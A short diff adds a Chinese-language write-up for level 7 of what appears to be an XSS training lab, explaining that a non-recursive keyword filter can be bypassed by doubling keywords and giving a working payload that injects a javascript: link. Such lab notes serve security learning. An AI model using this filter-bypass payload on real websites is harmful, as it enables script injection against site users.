@@ -1,0 +1,10 @@
+第7关
+
+这关过滤了关键词和大小写，但不是循环过滤
+
+可以双写绕过
+
+"><a hrhrefef=javascrscriptipt:alert(1)>
+
+
+弹窗成功！！！
